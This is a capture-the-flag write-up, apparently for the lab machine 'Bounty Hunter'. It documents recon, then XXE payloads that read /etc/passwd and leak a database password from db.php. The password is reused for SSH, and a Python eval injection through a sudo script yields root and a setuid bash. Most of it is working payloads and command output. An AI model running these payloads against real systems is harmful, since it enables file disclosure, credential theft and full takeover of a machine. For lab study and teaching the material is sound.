\chapter{Bounty hunter}
\begin{itemize}
    \item {\bf technics}: XXE, python eval 
    \item {\bf Components}: 
    \item {\bf tools}: 
\end{itemize}


\section{Recon}
\subsection{nmap}
\begin{verbatim}
TARGET_IP=10.10.11.100
$ PORTS=$( sudo nmap --min-rate=1000 -T4 -p- $TARGET_IP | grep '^[0-9]' | 
    cut -d'/' -f 1 | tr '\n' ',' | sed s/',$'//)
$ echo $PORTS
$ sudo nmap -sVC -p$PORTS $TARGET_IP


PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 d44cf5799a79a3b0f1662552c9531fe1 (RSA)
|   256 a21e67618d2f7a37a7ba3b5108e889a6 (ECDSA)
|_  256 a57516d96958504a14117a42c1b62344 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Bounty Hunters
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
\end{verbatim}





\section{http}

\subsection{Fuzzing}
\begin{verbatim}
$ ffuf -u http://10.10.11.100/FUZZ -w common.txt -e .php

.htaccess.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
.hta.php                [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 47ms]
.hta                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 48ms]
.htaccess               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 51ms]
.htpasswd.php           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 52ms]
.htpasswd               [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 52ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 29ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 26ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 43ms]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 29ms]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 30ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 28ms]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 40ms]
resources               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 47ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 27ms]

\end{verbatim}

\subsection{log\_submit.php}

\begin{verbatim}
function returnSecret(data) {
	return Promise.resolve($.ajax({
            type: "POST",
            data: {"data":data},
            url: "tracker_diRbPr00f314.php"
            }));
}

async function bountySubmit() {
	try {
		var xml = `<?xml  version="1.0" encoding="ISO-8859-1"?>
		<bugreport>
		<title>${$('#exploitTitle').val()}</title>
		<cwe>${$('#cwe').val()}</cwe>
		<cvss>${$('#cvss').val()}</cvss>
		<reward>${$('#reward').val()}</reward>
		</bugreport>`
		let data = await returnSecret(btoa(xml));
  		$("#return").html(data)
	}
	catch(error) {
		console.log('Error:', error);
	}
}
\end{verbatim}

XXE ?

\begin{verbatim}
$cat payload.xml
<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE pwn [<!ENTITY payload "pwned">]>
<bugreport>
<title>&payload;</title>
<cwe>&payload;</cwe>
<cvss>&payload;</cvss>
<reward>&payload;</reward>
</bugreport>

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE pwn [<!ENTITY payload "pwned">]>
<bugreport>
                <title>&payload;</title>
                <cwe>&payload;</cwe>
                <cvss>&payload;</cvss>
                <reward>&payload;</reward>
</bugreport>

$ curl -XPOST http://10.10.11.100/tracker_diRbPr00f314.php \
    -H 'Content-type: application/x-www-form-urlencoded;  charset=UTF-8' \
    -d "data=$(cat payload.xml |pencode b64encode urlencode)"
If DB were ready, would have added:
<table>
  <tr>
    <td>Title:</td>
    <td>pwned</td>
  </tr>
  <tr>
    <td>CWE:</td>
    <td>pwned</td>
  </tr>
  <tr>
    <td>Score:</td>
    <td>pwned</td>
  </tr>
  <tr>
    <td>Reward:</td>
    <td>pwned</td>
  </tr>
</table>

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE pwn [<!ENTITY payload SYSTEM 'file:///etc/passwd'>]>
<bugreport>
<title>&payload;</title>
</bugreport>

$cat payload.xml
$ curl -XPOST http://10.10.11.100/tracker_diRbPr00f314.php \
    -H 'Content-type: application/x-www-form-urlencoded;  charset=UTF-8' \
    -d "data=$(cat payload.xml |pencode b64encode urlencode)"


...SNIP...
development:x:1000:1000:Development:/home/development:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
...SNIP

<?xml  version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE pwn [<!ENTITY payload SYSTEM 'php://filter/convert.base64-encode/resource=db.php'>]>
<bugreport>
<title>&payload;</title>
</bugreport>

...SNIP...
    <td>PD9waHAKLy8gVE9ETyAtPiBJbXBsZW1lbnQgbG9naW4gc3lzdGVtIHdpdGggdGhlIGRhdGFiYXNlLgokZGJzZXJ2ZXIgPSAibG9jYWxob3N0IjsKJGRibmFtZSA9ICJib3VudHkiOwokZGJ1c2VybmFtZSA9ICJhZG1pbiI7CiRkYnBhc3N3b3JkID0gIm0xOVJvQVUwaFA0MUExc1RzcTZLIjsKJHRlc3R1c2VyID0gInRlc3QiOwo/Pgo=</td>
...SNIP...

<?php
// TODO -> Implement login system with the database.
$dbserver = "localhost";
$dbname = "bounty";
$dbusername = "admin";
$dbpassword = "m19RoAU0hP41A1sTsq6K";
$testuser = "test";
?>

\end{verbatim}


\section{Foothold}

\subsection{development}

\begin{verbatim}
# m19RoAU0hP41A1sTsq6K
$ ssh-keygen -t ed25519 -f ./id_ed25519
$ ssh development@10.10.11.100

development@bountyhunter:~/.ssh$ echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPT2lPFBQM8cFzH3aUwsXd5LPWsxniBqy9xzbfQvm3HH jubeaz@jubeaz' > authorized_keys

$ cat contract.txt
Hey team,

I'll be out of the office this week but please make sure that our contract with Skytrain Inc gets completed.

This has been our first job since the "rm -rf" incident and we can't mess this up. Whenever one of you gets on please have a look at the internal tool they sent over. There have been a handful of tickets submitted that have been failing validation and I need you to figure out why.

I set up the permissions for you to test this. Good luck.

-- John
development@bountyhunter:~$ ls /opt/
skytrain_inc
development@bountyhunter:~$ ls /opt/skytrain_inc/
invalid_tickets  ticketValidator.py

$ sudo -l
Matching Defaults entries for development on bountyhunter:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

\end{verbatim}

\begin{verbatim}
#Skytrain Inc Ticket Validation System 0.1
#Do not distribute this file.

def load_file(loc):
    if loc.endswith(".md"):
        return open(loc, 'r')
    else:
        print("Wrong file type.")
        exit()

def evaluate(ticketFile):
    #Evaluates a ticket to check for ireggularities.
    code_line = None
    for i,x in enumerate(ticketFile.readlines()):
        if i == 0:
            if not x.startswith("# Skytrain Inc"):
                return False
            continue
        if i == 1:
            if not x.startswith("## Ticket to "):
                return False
            print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
            continue

        if x.startswith("__Ticket Code:__"):
            code_line = i+1
            continue

        if code_line and i == code_line:
            if not x.startswith("**"):
                return False
            ticketCode = x.replace("**", "").split("+")[0]
            if int(ticketCode) % 7 == 4:
                validationNumber = eval(x.replace("**", ""))
                if validationNumber > 100:
                    return True
                else:
                    return False
    return False

def main():
    fileName = input("Please enter the path to the ticket file.\n")
    ticket = load_file(fileName)
    #DEBUG print(ticket)
    result = evaluate(ticket)
    if (result):
        print("Valid ticket.")
    else:
        print("Invalid ticket.")
    ticket.close

main()

\end{verbatim}


donc le code dangereux c'est 
\begin{verbatim}
validationNumber = eval(x.replace("**", ""))
\end{verbatim}

\begin{verbatim}
$ cat exploit.md
# Skytrain Inc
## Ticket to Jubeaz
__Ticket Code:__
**4+ __import__('os').system('id')
##Issued: 2021/06/21
#End Ticket


$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
exploit.md
Destination: Jubeaz
uid=0(root) gid=0(root) groups=0(root)
Invalid ticket.


development@bountyhunter:~$ cat exploit.md
# Skytrain Inc
## Ticket to Jubeaz
__Ticket Code:__
**4+ __import__('os').system('chmod +s /usr/bin/bash')
##Issued: 2021/06/21
#End Ticket
development@bountyhunter:~$ sudo /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py
Please enter the path to the ticket file.
exploit.md
Destination: Jubeaz
Invalid ticket.
development@bountyhunter:~$ ls -l /usr/bin/bash
-rwsr-sr-x 1 root root 1183448 Jun 18  2020 /usr/bin/bash
\end{verbatim}
